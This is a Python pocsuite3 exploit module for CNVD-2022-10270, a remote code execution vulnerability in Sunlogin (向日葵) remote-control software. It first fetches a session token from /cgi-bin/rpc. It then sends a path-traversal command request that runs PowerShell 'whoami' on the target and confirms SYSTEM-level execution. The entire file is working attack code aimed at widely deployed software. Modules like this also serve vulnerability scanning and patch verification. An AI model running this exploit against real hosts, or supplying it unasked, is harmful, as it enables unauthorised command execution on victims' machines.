# !/usr/bin/env python
# -*- coding: UTF-8 -*-
import json
import re
from urllib.parse import urlparse

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE


class xrk_POC(POCBase):
    vulID = 'CNVD-2022-10270'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2021-03-23'
    createDate = '2021-10-19'
    updateDate = '2021-10-19'
    references = ['']
    name = '向日葵远控软件存在远程代码执行漏洞'
    appPowerLink = ''
    appName = '向日葵远控软件'
    appVersion = """向日葵个人版for Windows <= 11.0.0.33
    向日葵简约版 <= V1.0.1.43315"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''向日葵远控软件存在远程代码执行漏洞'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        target = self.url
        if target:
            try:
                self.timeout = 5
                vulurl = target + "/cgi-bin/rpc"
                # 获取hostname
                parse = urlparse(vulurl)
                headers = {
                    "Host": "{}".format(parse.netloc)
                }
                data = "action=verify-haras"
                
                resq = requests.post(vulurl, headers=headers, timeout=self.timeout, data=data,verify=False)
                print ("resq.txt")
                c = json.loads(resq.text)
                verify_string = c['verify_string']
                if resq.status_code == 200:
                    if "verify_string" in resq.text:
                        cookies = "CID=" + verify_string
                        pocurl = target + "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+whoami"
                        header = {
                            "Cookie": "{}".format(cookies)
                        }
                        resp = requests.get(pocurl, headers=header,timeout=self.timeout,verify=False)
                        if "system" in resp.text or "authority" in resp.text:
                            result['VerifyInfo'] = {}
                            result['VerifyInfo']['URL'] = target
            except Exception as e:
                print(e)

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(xrk_POC)
